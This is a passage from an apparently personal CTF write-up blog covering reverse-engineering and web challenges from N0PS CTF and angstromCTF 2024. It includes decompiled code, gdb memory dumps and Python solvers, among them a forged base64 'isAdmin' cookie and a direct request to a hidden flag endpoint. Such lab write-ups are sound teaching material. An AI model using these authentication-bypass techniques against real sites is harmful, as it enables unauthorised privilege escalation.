__int64 v22; // rdx unsigned int v23; // eax _QWORD *v24; // rdx unsigned __int64 v25; // rcx unsigned int v26; // eax unsigned int v27; // eax unsigned int v28; // edx __int64 v29; // rsi size_t *v30; // [rsp+8h] [rbp-60h] __m128i v31; // [rsp+10h] [rbp-58h] BYREF unsigned __int64 v32; // [rsp+28h] [rbp-40h] v30 = (size_t *)a4; v32 = __readfsqword(0x28u); v5 = *a3; v31 = v5; if ( v5.m128i_i8[0] ) { if ( v5.m128i_i8[1] ) { if ( (v5.m128i_i32[0] \u0026amp; 0xFF0000) != 0 ) { if ( (v5.m128i_i32[0] \u0026amp; 0xFF000000) != 0 ) { if ( v5.m128i_i8[4] ) { if ( v5.m128i_i8[5] ) { if ( v5.m128i_i8[6] ) { if ( HIBYTE(v5.m128i_i64[0]) ) { if ( v5.m128i_i8[8] ) { if ( v5.m128i_i8[9] ) { if ( (v5.m128i_i32[2] \u0026amp; 0xFF0000) != 0 ) { if ( (v5.m128i_i32[2] \u0026amp; 0xFF000000) != 0 ) { if ( v5.m128i_i8[12] ) { if ( v5.m128i_i8[13] ) { if ( v5.m128i_i8[14] ) goto LABEL_16; v22 = 15LL; } else { v22 = 14LL; } } else { v22 = 13LL; } } else { v22 = 12LL; } } else { v22 = 11LL; } } else { v22 = 10LL; } } else { v22 = 9LL; } } else { v22 = 8LL; } } else { v22 = 7LL; } } else { v22 = 6LL; } } else { v22 = 5LL; } } else { v22 = 4LL; } } else { v22 = 3LL; } } else { v22 = 2LL; } } else { v22 = 1LL; } v23 = 16 - v22; v24 = (__int64 *)((char *)v31.m128i_i64 + v22); if ( v23 \u0026gt;= 8 ) { *v24 = 0LL; *(_QWORD *)((char *)v24 + v23 - 8) = 0LL; v25 = (unsigned __int64)(v24 + 1) \u0026amp; 0xFFFFFFFFFFFFFFF8LL; v26 = ((_DWORD)v24 - v25 + v23) \u0026amp; 0xFFFFFFF8; if ( v26 \u0026gt;= 8 ) { v27 = v26 \u0026amp; 0xFFFFFFF8; v28 = 0; do { v29 = v28; v28 += 8; *(_QWORD *)(v25 + v29) = 0LL; } while ( v28 \u0026lt; v27 ); } } else if ( (v23 \u0026amp; 4) != 0 ) { *(_DWORD *)v24 = 0; *(_DWORD *)((char *)v24 + v23 - 4) = 0; } else if ( v23 ) { *(_BYTE *)v24 = 0; if ( (v23 \u0026amp; 2) != 0 ) *(_WORD *)((char *)v24 + v23 - 2) = 0; } LABEL_16: if ( !n ) return 0LL; v6 = (n \u0026gt;\u0026gt; 2) - (((n \u0026amp; 3) == 0) - 1LL); sleep(1u); v7 = (unsigned int *)calloc(v6, 4uLL); v8 = v7; if ( !v7 ) return 0LL; memcpy(v7, src, n); sleep(1u); v9 = (__m128i *)calloc(4uLL, 4uLL); if ( !v9 ) { free(v8); return 0LL; } *v9 = _mm_load_si128(\u0026amp;v31); if ( ptrace(PTRACE_TRACEME, 0LL, 1LL, 0LL) == -1 ) return 0LL; ptrace(PTRACE_DETACH, 0LL, 1LL, 0LL); v10 = (n \u0026gt;\u0026gt; 2) - ((n \u0026amp; 3) == 0); if ( (_DWORD)v6 != 1 ) { v11 = *v8; v12 = -1640531527 * (0x34 / (unsigned int)v6 + 6); do { v13 = \u0026amp;v8[v10]; v14 = v6 - 1; v15 = v12 \u0026gt;\u0026gt; 2; do { v16 = v13[(unsigned int)(v6 - 2) - (unsigned __int64)v10]; --v13; v11 = v13[1] - ((((4 * v11) ^ (v16 \u0026gt;\u0026gt; 5)) + ((16 * v16) ^ (v11 \u0026gt;\u0026gt; 3))) ^ ((v16 ^ v9-\u0026gt;m128i_i32[((unsigned __int8)v15 ^ (unsigned __int8)v14) \u0026amp; 3]) + (v11 ^ v12))); v13[1] = v11; --v14; } while ( v14 ); v11 = *v8 - (((v12 ^ v11) + (v9-\u0026gt;m128i_i32[v15 \u0026amp; 3] ^ v8[v10])) ^ (((16 * v8[v10]) ^ (v11 \u0026gt;\u0026gt; 3)) + ((4 * v11) ^ (v8[v10] \u0026gt;\u0026gt; 5)))); *v8 = v11; v12 += 1640531527; } while ( v12 ); } v17 = 4 * v6; v18 = v8[v6 - 1]; if ( v18 \u0026gt; v17 - 4 || v18 \u0026lt; v17 - 7 ) { v19 = 0LL; } else { v19 = malloc(v18 + 1); memcpy(v19, v8, v18); v20 = v30; *((_BYTE *)v19 + v18) = 0; *v20 = v18; } free(v8); free(v9); return v19; }\rIf the condition is satisfied, the main function then creates a string from the absolute values of the four integers, copies a certain memory region into a buffer, calls the sub_1A50 function with this buffer, prints the result, frees the allocated memory, and exits with a status of 0.\nThe sub_1A50 function seems to be a decryption function. It takes a source buffer and its size, and performs a series of operations on it, including a sleep operation, memory allocation and copying, and some bitwise operations.\nTo get the four integers in the sub_1460 function, the sub_1460 function checks if the four input integers satisfy the following four equations:\n$$3a_4 + a_3 + 4a_2 - 10a_1 = 28$$ $$9a_2 - 8a_1 + 6a_3 - 2a_4 = 72$$ $$a_4 - 3a_2 - 2a_1 - 8a_3 = 29$$ $$a_3 + 5a_1 + 7a_2 - 6a_4 = 88$$ where (a1, a2, a3, a4) are the four integers we\u0026rsquo;re looking for.\nintegers.py\r1from sympy import symbols, Eq, solve 2 3a1, a2, a3, a4 = symbols(\u0026#39;a1 a2 a3 a4\u0026#39;) 4 5eq1 = Eq(3*a4 + a3 + 4*a2 - 10*a1, 28) 6eq2 = Eq(9*a2 - 8*a1 + 6*a3 - 2*a4, 72) 7eq3 = Eq(a4 - 3*a2 - 2*a1 - 8*a3, 29) 8eq4 = Eq(a3 + 5*a1 + 7*a2 - 6*a4, 88) 9 10solution = solve((eq1, eq2, eq3, eq4), (a1, a2, a3, a4)) 11print(solution)\r$ python3 integers.py {a1: -3, a2: 8, a3: -7, a4: -9} $ ./img -3 8 -7 -9 N0PS{r1CKUNr0111N6}\rFLAG\rN0PS{r1CKUNr0111N6}\nWeb Web Cook Overview\rAuthor: algorab Description: The best recipes for a perfect website :p https://nopsctf-web-cook.chals.io/ Next in web category challenge,\nBy the instructions on the web that we need to create a cookie with a JSON object, base64 encode it and then send it with request. The JSON object should have a key isAdmin set to 1. Here\u0026rsquo;s how we can do it.\nsolver.py\r1import requests 2import base64 3import json 4import re 5 6url = \u0026#39;https://nopsctf-web-cook.chals.io/\u0026#39; 7 8data = {\u0026#34;username\u0026#34;:\u0026#34;Bagas Oli Samping\u0026#34;, \u0026#34;isAdmin\u0026#34;:1} 9json_data = json.dumps(data) 10 11encoded_data = base64.b64encode(json_data.encode()).decode() 12cookies = {\u0026#39;session\u0026#39;: encoded_data} 13response = requests.post(url, cookies=cookies) 14print(response.text) 15 16flag = re.findall(\u0026#39;N0PS{.*}\u0026#39;, response.text) 17print(\u0026#34;FLAG:\u0026#34;, flag[0])\r$ python3 solver.py \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Recipe - PHP cooking\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;style.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;header\u0026gt; \u0026lt;h1\u0026gt;Cookie-based PHP authentication\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026#34;username-input\u0026#34;\u0026gt; \u0026lt;h4\u0026gt;Hello Bagas Oli Samping!\u0026lt;/h4\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;section class=\u0026#34;recipe-section\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;recipe-card\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;Ingredients:\u0026lt;/h2\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;Fresh PHP\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;A cookie\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;Bad security skills flavour\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;Base64 ustensils\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;Minced JSON\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;Gullibility sauce\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;Internet hoven\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;recipe-card\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;Instructions:\u0026lt;/h2\u0026gt; \u0026lt;ol\u0026gt; \u0026lt;li\u0026gt;Use the Base64 to mix the cookie with the JSON. You should obtain a PHP array.\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;Use the fresh PHP seasoned with your gullibility to check if the isAdmin value of the cookie is set to 1.\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;Next, add your bad security skills flavour to give the flag.\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;Put it in the Internet hoven. After some minutes, you should see the results.\u0026lt;/li\u0026gt; \u0026lt;/ol\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;div style=\u0026#39;color:red\u0026#39;\u0026gt;You are an admin! Here is your flag: N0PS{y0u_Kn0W_H0w_t0_c00K_n0W}\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; FLAG: N0PS{y0u_Kn0W_H0w_t0_c00K_n0W}\rFLAG\rN0PS{y0u_Kn0W_H0w_t0_c00K_n0W}\n","date":"2024-06-02","id":11,"permalink":"/posts/ctfs/2024/n0ps-ctf-2024/","summary":"https://ctftime.org/event/2358\nCHALL\u0026rsquo;S SOLVED Category Challenge Misc Morse Me OSINT Where Am I 1/3 Reverse Just Read Reverse Reverse Me Web Web Cook Misc Morse Me Overview\rAuthor: algorab Description: biiip biiip biiip biiip biiip bip biiip bip bip bip bip bip challenge.","tags":[],"title":"N0PS CTF 2024"},{"content":"https://ctftime.org/event/2375\nCHALL\u0026rsquo;S SOLVED Category Challenge Reverse Engineering Guess the Flag Reverse Engineering switcher Web spinner Reverse Engineering Guess the Flag Overview\rAuthor: rous Description: Do you have what it takes to guess the flag? Find out here guess_the_flag Decompiled of the main function\ndecompiled main\rint __cdecl main(int argc, const char **argv, const char **envp) { char *v3; // rbx char _0[72]; // [rsp+0h] [rbp+0h] BYREF unsigned __int64 vars48; // [rsp+48h] [rbp+48h] vars48 = __readfsqword(0x28u); puts(\u0026#34;Go ahead, guess the flag: \u0026#34;); v3 = _0; fgets(_0, 63, stdin); while ( strlen(_0) \u0026gt; v3 - _0 ) *v3++ ^= 1u; if ( !strcmp(_0, secretcode) ) puts(\u0026#34;Correct! It was kinda obvious tbh.\u0026#34;); else puts(\u0026#34;Wrong. Not sure why you\u0026#39;d think it\u0026#39;d be that.\u0026#34;); return 0; }\rFrom the decompiled code is a simple program that reads a string, applies a bitwise XOR operation to each character in the string and then compares the result to a secretcode.\nThe XOR operation being applied *v3++ ^= 1u; which flips the least significant bit of each character in the input.\n.data:0000000000004020 secretcode db \u0026#39;`bugzbnllhuude^un^uid^md`ru^rhfohghb`ou^chu|\u0026#39;,0\rThe secretcode from .data section is 'bugzbnllhuude^un^uid^mdru^rhfohghbou^chu|.\nHere\u0026rsquo;s the final solver\nsolver.py\r1secret_code = \u0026#39;`bugzbnllhuude^un^uid^md`ru^rhfohghb`ou^chu|\u0026#39; 2original_input = \u0026#39;\u0026#39;.join(chr(ord(c) ^ 1) for c in secret_code) 3print(original_input)\r$ python3 solver.py actf{committed_to_the_least_significant_bit}\rFLAG\ractf{committed_to_the_least_significant_bit}\nswitcher Overview\rAuthor: aplet123 Description: It\u0026rsquo;s incredible how completely indiscernible the functions are\u0026hellip; switcher Decompiled of the sub_5540 function\ndecompiled sub_5540\rvoid __fastcall sub_5540(_BYTE *a1) { _BYTE *v1; // rdi _BYTE *v2; // rdi _BYTE *v3; // rdi _BYTE *v4; // rdi _BYTE *v5; // rdi _BYTE *v6; // rdi _BYTE *v7; // rdi _BYTE *v8; // rdi _BYTE *v9; // rdi _BYTE *v10; // rdi _BYTE *v11; // rdi _BYTE *v12; // rdi _BYTE *v13; // rdi _BYTE *v14; // rdi _BYTE *v15; // rdi _BYTE *v16; // rdi _BYTE *v17; // rdi _BYTE *v18; // rdi _BYTE *v19; // rdi _BYTE *v20; // rdi _BYTE *v21; // rdi _BYTE *v22; // rdi _BYTE *v23; // rdi _BYTE *v24; // rdi _BYTE *v25; // rdi _BYTE *v26; // rdi _BYTE *v27; // rdi _BYTE *v28; // rdi _BYTE *v29; // rdi _BYTE *v30; // rdi _BYTE *v31; // rdi _BYTE *v32; // rdi _BYTE *v33; // rdi _BYTE *v34; // rdi _BYTE *v35; // rdi _BYTE *v36; // rdi if ( *a1 == 106 ) { v36 = a1 + 1; if ( *v36 == 117 ) { v35 = v36 + 1; if ( *v35 == 109 ) { v34 = v35 + 1; if ( *v34 == 112 ) { v33 = v34 + 1; if ( *v33 == 105 ) { v32 = v33 + 1; if ( *v32 == 110 ) { v31 = v32 + 1; if ( *v31 == 103 ) { v30 = v31 + 1; if ( *v30 == 95 ) { v29 = v30 + 1; if ( *v29 == 109 ) { v28 = v29 + 1; if ( *v28 == 121 ) { v27 = v28 + 1; if ( *v27 == 95 ) { v26 = v27 + 1; if ( *v26 == 119 ) { v25 = v26 + 1; if ( *v25 == 97 ) { v24 = v25 + 1; if ( *v24 == 121 ) { v23 = v24 + 1; if ( *v23 == 95 ) { v22 = v23 + 1; if ( *v22 == 116 ) { v21 = v22 + 1; if ( *v21 == 111 ) { v20 = v21 + 1; if ( *v20 == 95 ) { v19 = v20 + 1; if ( *v19 == 116 ) { v18 = v19 + 1; if ( *v18 == 104 ) { v17 = v18 + 1; if ( *v17 == 101 ) { v16 = v17 + 1; if ( *v16 == 95 ) { v15 = v16 + 1; if ( *v15 == 102 ) { v14 = v15 + 1; if ( *v14 == 108 ) { v13 = v14 + 1; if ( *v13 == 97 ) { v12 = v13 + 1; if ( *v12 == 103 ) { v11 = v12 + 1; if ( *v11 == 95 ) { v10 = v11 + 1; if ( *v10 == 111 ) { v9 = v10 + 1; if ( *v9 == 110 ) { v8 = v9 + 1; if ( *v8 == 101 ) { v7 = v8 + 1; if ( *v7 == 95 ) { v6 = v7 + 1; if ( *v6 == 98 ) { v5 = v6 + 1; if ( *v5 == 121 ) { v4 = v5 + 1; if ( *v4 == 95 ) { v3 = v4 + 1; if ( *v3 == 111 ) { v2 = v3 + 1; if ( *v2 == 110 ) { v1 = v2 + 1; if ( *v1 == 101 ) sub_1200(v1 + 1); } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } }\rThe sub_5540 function checks if the input string matches a specific sequence of ASCII characters. Each if statement checks if the current character equals a specific ASCII value, and if it does, it moves to the next character. If all checks pass, it calls the sub_1200 function.\nThe ASCII values in the if statements correspond to the following characters:\n106 -\u0026gt; \u0026#39;j\u0026#39; 117 -\u0026gt; \u0026#39;u\u0026#39; 109 -\u0026gt; \u0026#39;m\u0026#39; 112 -\u0026gt; \u0026#39;p\u0026#39; 105 -\u0026gt; \u0026#39;i\u0026#39; 110 -\u0026gt; \u0026#39;n\u0026#39; 103 -\u0026gt; \u0026#39;g\u0026#39; 95 -\u0026gt; \u0026#39;_\u0026#39; 109 -\u0026gt; \u0026#39;m\u0026#39; 121 -\u0026gt; \u0026#39;y\u0026#39; ... 101 -\u0026gt; \u0026#39;e\u0026#39;\rFinal solver\nsolver.py\r1flag = [106, 117, 109, 112, 105, 110, 103, 95, 109, 121, 95, 119, 97, 121, 95, 116, 111, 95, 116, 104, 101, 95, 102, 108, 97, 103, 95, 111, 110, 101, 95, 98, 121, 95, 111, 110, 101] 2dec = \u0026#39;\u0026#39;.join(chr(i) for i in flag) 3print(f\u0026#39;actf{{{dec}}}\u0026#39;)\r$ python3 solver.py actf{jumping_my_way_to_the_flag_one_by_one}\rFLAG\ractf{jumping_my_way_to_the_flag_one_by_one}\nWeb spinner Overview\rAuthor: BrownieInMotion Description: spin 10,000 times for flag https://spinner.web.actf.co/ Move on to 1 web challenge that I only solved, the web provided spins a spinner and once the total rotation reaches 10,000 full spins.\nHowever, manually spinning this to reach 10,000 full spins would be quite time-consuming and impractical. Instead, we can manipulate the JavaScript code to reach the required total spins instantly.\n\u0026lt;script\u0026gt; const state = { dragging: false, value: 0, total: 0, flagged: false, } const message = async () =\u0026gt; { if (state.flagged) return const element = document.querySelector(\u0026#39;.message\u0026#39;) element.textContent = Math.floor(state.total / 360) if (state.total \u0026gt;= 10_000 * 360) { state.flagged = true const response = await fetch(\u0026#39;/falg\u0026#39;, { method: \u0026#39;POST\u0026#39; }) element.textContent = await response.text() } } message() const draw = () =\u0026gt; { const spinner = document.querySelector(\u0026#39;.spinner\u0026#39;) const degrees = state.value spinner.style.transform = `rotate(${degrees}deg)` } const down = () =\u0026gt; { state.dragging = true } const move = (e) =\u0026gt; { if (!state.dragging) return const spinner = document.querySelector(\u0026#39;.spinner\u0026#39;) const center = { x: spinner.offsetLeft + spinner.offsetWidth / 2, y: spinner.offsetTop + spinner.offsetHeight / 2, } const dy = e.clientY - center.y const dx = e.clientX - center.x const angle = (Math.atan2(dy, dx) * 180) / Math.PI const value = angle \u0026lt; 0 ? 360 + angle : angle const change = value - state.value if (0 \u0026lt; change \u0026amp;\u0026amp; change \u0026lt; 180) state.total += change if (0 \u0026gt; change \u0026amp;\u0026amp; change \u0026gt; -180) state.total += change if (change \u0026gt; 180) state.total -= 360 - change if (change \u0026lt; -180) state.total += 360 + change state.value = value draw() message() } const up = () =\u0026gt; { state.dragging = false } document.querySelector(\u0026#39;.handle\u0026#39;).addEventListener(\u0026#39;mousedown\u0026#39;, down) window.addEventListener(\u0026#39;mousemove\u0026#39;, move) window.addEventListener(\u0026#39;mouseup\u0026#39;, up) window.addEventListener(\u0026#39;blur\u0026#39;, up) window.addEventListener(\u0026#39;mouseleave\u0026#39;, up) \u0026lt;/script\u0026gt;\rFrom the JavaScript source-code, the total rotation reaches 10,000 full spins (360 degrees * 10,000), it makes a POST request to the /falg endpoint to get the flag.\nThe simple way to do it using the browser\u0026rsquo;s JavaScript console that set the total spins to the required value and then call the message function to update the total and fetch the flag\nstate.total = 10_000 * 360; message();\rFinal solver using python\nsolver.py\r1import requests 2 3url = \u0026#39;https://spinner.web.actf.co\u0026#39; 4endpoint = \u0026#39;/falg\u0026#39; 5 6response = requests.post(url + endpoint) 7 8print(response.text)\r$ python3 solver.py actf{b152d497db04fcb1fdf6f3bb64522d5e}\rFLAG\ractf{b152d497db04fcb1fdf6f3bb64522d5e}\n","date":"2024-05-25","id":12,"permalink":"/posts/ctfs/2024/angstromctf-2024/","summary":"https://ctftime.org/event/2375\nCHALL\u0026rsquo;S SOLVED Category Challenge Reverse Engineering Guess the Flag Reverse Engineering switcher Web spinner Reverse Engineering Guess the Flag Overview\rAuthor: rous Description: Do you have what it takes to guess the flag?","tags":[],"title":"angstromCTF 2024"},{"content":"https://ctftime.org/event/2364\nCHALL\u0026rsquo;S SOLVED Category Challenge Reverse Engineering IPromise Reverse Engineering Taylor\u0026rsquo;s First Swift Reverse Engineering Ring Cycle 1 - Basics Web Exploitation iDoor Web Exploitation All About Robots Warmups QRRRRRRRR Warmups EICAR Warmups That\u0026rsquo;s Not My Base Warmups Uriel Warmups Twine Reverse Engineering IPromise Overview\rAuthor: @soups71 Description: Instead of making the next IPhone, I made this challenge. I do make a truthful promise though\u0026hellip; IPromise First rev category challenge, let\u0026rsquo;s try to execute the binary first\n$ ./IPromise I promise that I do some decryption! You just have to find out where. Writing code shouldn\u0026#39;t be necessary ;)\rAll we have to do is decompile the binary according to the output that has been given. But when I first checked using gdb, I saw that it had a lot of functions.\n$ gdb ./IPromise gef➤ info functions All defined functions: Non-debugging symbols: 0x0000000000401000 _init 0x0000000000401040 puts@plt 0x0000000000401050 main 0x0000000000401065 decryptIPromise 0x00000000004010d0 _start 0x0000000000401100 _dl_relocate_static_pie 0x0000000000401110 deregister_tm_clones 0x0000000000401140 register_tm_clones 0x0000000000401180 __do_global_dtors_aux 0x00000000004011b0 frame_dummy 0x00000000004011b6 KeyExpansion 0x000000000040124e AddRoundKey 0x0000000000401285 xtime 0x0000000000401294 Cipher 0x0000000000401405 InvCipher 0x0000000000401633 AES_init_ctx 0x000000000040163c AES_init_ctx_iv 0x000000000040165d AES_ctx_set_iv 0x000000000040166c AES_ECB_encrypt 0x0000000000401678 AES_ECB_decrypt 0x0000000000401684 AES_CBC_encrypt_buffer 0x00000000004016e4 AES_CBC_decrypt_buffer 0x0000000000401740 AES_CTR_xcrypt_buffer 0x00000000004017c8 _fini\rHere\u0026rsquo;s the decompile of decryptIPromise function\ndecompiled decryptIPromise\r__int64 decryptIPromise() { __int128 v1; // [rsp+0h] [rbp-D8h] BYREF char v2[200]; // [rsp+10h] [rbp-C8h] BYREF v1 = xmmword_4022B0; AES_init_ctx(v2, \u0026amp;v1); AES_ECB_decrypt(v2, \u0026amp;encrypted); AES_ECB_decrypt(v2, \u0026amp;unk_404050); return AES_ECB_decrypt(v2, \u0026amp;unk_404060); }\rThis function initializes an AES context with a key, and then performs AES decryption in ECB mode on three blocks of data.\nThen, the key initialization is performed by AES_init_ctx function calls KeyExpansion to expand the provided key.\ndecompiled AES_init_ctx\rchar __fastcall AES_init_ctx(_BYTE *a1, __int64 a2) { return KeyExpansion(a1, a2); }\rThe KeyExpansion function expands the key for AES encryption/decryption, this function takes the key provided (a2) and generates the expanded key used in AES operations.\ndecompiled KeyExpansion\rchar __fastcall KeyExpansion(_BYTE *a1, __int64 a2) { // Key expansion logic }\rThe AES_ECB_decrypt function is responsible for the actual decryption\ndecompiled AES_ECB_decrypt\r__int64 __fastcall AES_ECB_decrypt(__int64 a1, __int64 a2) { return InvCipher(a2, a1); }\rThe InvCipher function performs the inverse AES cipher operation\ndecompiled InvCipher\r__int64 __fastcall InvCipher(__int64 a1, __int64 a2) { // Inverse AES cipher logic }\rWe need to extract the necessary values such as xmmword_4022B0 \u0026amp; encrypted, let\u0026rsquo;s dissasembly with gdb \u0026gt; set breakpoint to decryptIPromise \u0026gt; run\n$ gdb ./IPromise gef➤ b decryptIPromise Breakpoint 1 at 0x401065 gef➤ run\rFirst of all extract the xmmword_4022B0 memory to find the AES key,\ngef➤ x/16xb 0x4022B0 0x4022b0: 0x2b 0x7e 0x15 0x16 0x28 0xae 0xd2 0xa6 0x4022b8: 0xab 0xf7 0x15 0x88 0x09 0xcf 0x4f 0x3c\rNext, inspect the encrypted (0x404040) memory to find the encrypted data.\ngef➤ x/64xb \u0026amp;encrypted 0x404040 \u0026lt;encrypted\u0026gt;: 0x0f 0x5f 0xa3 0xb9 0x09 0x23 0x71 0x50 0x404048 \u0026lt;encrypted+8\u0026gt;: 0xbb 0x4f 0x6f 0x6b 0x88 0x1d 0x96 0xc2 0x404050 \u0026lt;encrypted+16\u0026gt;: 0x80 0x29 0x5f 0xe0 0x71 0x90 0x64 0xa6 0x404058 \u0026lt;encrypted+24\u0026gt;: 0xe5 0x35 0x86 0x64 0xb4 0x0c 0xcb 0xb4 0x404060 \u0026lt;encrypted+32\u0026gt;: 0xd8 0x23 0x6f 0x12 0x02 0x54 0xe2 0x0b 0x404068 \u0026lt;encrypted+40\u0026gt;: 0x94 0x83 0xde 0x09 0xf4 0x3e 0x6d 0x24 0x404070 \u0026lt;completed.0\u0026gt;: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x404078: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\rAll values ​​have been successfully obtained, here are the final solver\nsolver.py\r1from Crypto.Cipher import AES 2 3key = bytes([0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c]) 4enc = bytes([0x0f, 0x5f, 0xa3, 0xb9, 0x09, 0x23, 0x71, 0x50, 0xbb, 0x4f, 0x6f, 0x6b, 0x88, 0x1d, 0x96, 0xc2, 0x80, 0x29, 0x5f, 0xe0, 0x71, 0x90, 0x64, 0xa6, 0xe5, 0x35, 0x86, 0x64, 0xb4, 0x0c, 0xcb, 0xb4, 0xd8, 0x23, 0x6f, 0x12, 0x02, 0x54, 0xe2, 0x0b, 0x94, 0x83, 0xde, 0x09, 0xf4, 0x3e, 0x6d, 0x24]) 5 6# Initialize AES cipher in ECB mode with the key 7cipher = AES.new(key, AES.MODE_ECB) 8 9dec = cipher.decrypt(enc) 10print(dec.strip())\r$ python3 solver.py b\u0026#39;flag{d41d8cd98f00b204e9800998ecf8427e}\u0026#39;\rFLAG\rflag{d41d8cd98f00b204e9800998ecf8427e}\nTaylor\u0026rsquo;s First Swift Overview\rAuthor: @alden Description: OMG did you hear that they named a programming language after Taylor Swift? taylor Second rev category challenge, based on the challenge description it looks like it uses the Swift or maybe Objective-C ? ok, whatever..\nThe xorEncrypt function takes two arguments, both of which are arrays of bytes. It enumerates over the first array, and for each element, it performs an XOR operation with an element from the second array at a corresponding index. The index is calculated as the current index modulo the length of the second array. The result of the XOR operation is then base64 encoded and returned.\ndecompiled xorEncrypt\r__int64 __fastcall xorEncrypt(_:_:)(__int64 a1, __int64 a2) { __int64 v2; // x0 __int64 result; // x0 __int64 v4; // x21 __int64 v5; // x1 __int64 v6; // x0 __int64 v7; // [xsp+8h] [xbp-C8h] __int64 v8; // [xsp+10h] [xbp-C0h] __int64 v9; // [xsp+20h] [xbp-B0h] __int64 v10; // [xsp+30h] [xbp-A0h] __int64 v11; // [xsp+38h] [xbp-98h] __int64 v13; // [xsp+50h] [xbp-80h] __int64 v14; // [xsp+58h] [xbp-78h] char v15[16]; // [xsp+60h] [xbp-70h] BYREF __int64 v16; // [xsp+70h] [xbp-60h] __int64 v17; // [xsp+78h] [xbp-58h] BYREF __int64 v18; // [xsp+80h] [xbp-50h] __int64 v19[5]; // [xsp+88h] [xbp-48h] BYREF v18 = 0LL; v19[4] = a1; v19[3] = a2; v19[1] = a1; v10 = __swift_instantiateConcreteTypeFromMangledName(\u0026amp;_sSays5UInt8VGMD); v11 = lazy protocol witness table accessor for type [UInt8] and conformance [A](); Sequence.enumerated()(v10); v19[0] = v19[2]; swift_bridgeObjectRetain(a2); v16 = a2; v13 = __swift_instantiateConcreteTypeFromMangledName(\u0026amp;_ss18EnumeratedSequenceVySays5UInt8VGGMD); v2 = lazy protocol witness table accessor for type EnumeratedSequence\u0026lt;[UInt8]\u0026gt; and conformance EnumeratedSequence\u0026lt;A\u0026gt;(); result = Sequence.map\u0026lt;A\u0026gt;(_:)(partial apply for closure #1 in xorEncrypt(_:_:), v15, v13, \u0026amp;dword_100000014, v2); v14 = result; if ( v4 ) { __break(1u); } else { swift_bridgeObjectRelease(a2); outlined destroy of EnumeratedSequence\u0026lt;[UInt8]\u0026gt;(v19); v18 = v14; swift_bridgeObjectRetain(v14); v17 = v14; v7 = Data.init\u0026lt;A\u0026gt;(_:)(\u0026amp;v17, v10, v11); v8 = v5; v6 = default argument 0 of Data.base64EncodedString(options:)(); v9 = Data.base64EncodedString(options:)(v6, v7, v8); outlined consume of Data._Representation(v7, v8); swift_bridgeObjectRelease(v14); return v9; } return result; }\rThe flagCheck function takes the user’s input and compares it to a hardcoded string. It first converts the input and the hardcoded string to arrays of bytes. Then it calls the xorEncrypt function with these two arrays as arguments. The result is compared to another hardcoded base64 string.\ndecompiled flagCheck\r__int64 __fastcall flagCheck(_:)(__int64 a1, __int64 a2) { __int64 v2; // x1 __int64 v3; // x1 __int64 v4; // x0 _BYTE *v5; // x1 __int64 v6; // x1 __int64 v7; // x1 __int64 v8; // x0 void *v9; // x1 __int64 v13; // [xsp+18h] [xbp-B8h] __int64 v14; // [xsp+20h] [xbp-B0h] __int64 v15; // [xsp+28h] [xbp-A8h] __int64 v16; // [xsp+50h] [xbp-80h] __int64 v17; // [xsp+58h] [xbp-78h] __int64 v18; // [xsp+60h] [xbp-70h] __int64 v19; // [xsp+68h] [xbp-68h] char v20; // [xsp+74h] [xbp-5Ch] __int64 v21[4]; // [xsp+78h] [xbp-58h] BYREF __int64 v22[3]; // [xsp+98h] [xbp-38h] BYREF __int64 v23[4]; // [xsp+B0h] [xbp-20h] BYREF v23[2] = a1; v23[3] = a2; v23[0] = ((__int64 (*)(void))String.utf8.getter)(); v23[1] = v2; lazy protocol witness table accessor for type String.UTF8View and conformance String.UTF8View(); v19 = Array.init\u0026lt;A\u0026gt;(_:)(v23, \u0026amp;dword_100000014, \u0026amp;dword_100000004); v22[2] = v19; v22[0] = String.utf8.getter(a1, a2); v22[1] = v3; v14 = Array.init\u0026lt;A\u0026gt;(_:)(v22, \u0026amp;dword_100000014, \u0026amp;dword_100000004); v4 = _allocateUninitializedArray\u0026lt;A\u0026gt;(_:)(9LL, \u0026amp;dword_100000014); *v5 = 115; v5[1] = 119; v5[2] = 105; v5[3] = 102; v5[4] = 116; v5[5] = 105; v5[6] = 101; v5[7] = 115; v5[8] = 33; v13 = _finalizeUninitializedArray\u0026lt;A\u0026gt;(_:)(v4, \u0026amp;dword_100000014); v15 = xorEncrypt(_:_:)(v14, v13); v18 = v6; swift_bridgeObjectRelease(v13); swift_bridgeObjectRelease(v14); v21[2] = v15; v21[3] = v18; v21[0] = String.utf8.getter(v15, v18); v21[1] = v7; v17 = Array.init\u0026lt;A\u0026gt;(_:)(v21, \u0026amp;dword_100000014, \u0026amp;dword_100000004); v8 = _allocateUninitializedArray\u0026lt;A\u0026gt;(_:)(52LL, \u0026amp;dword_100000014); qmemcpy(v9, 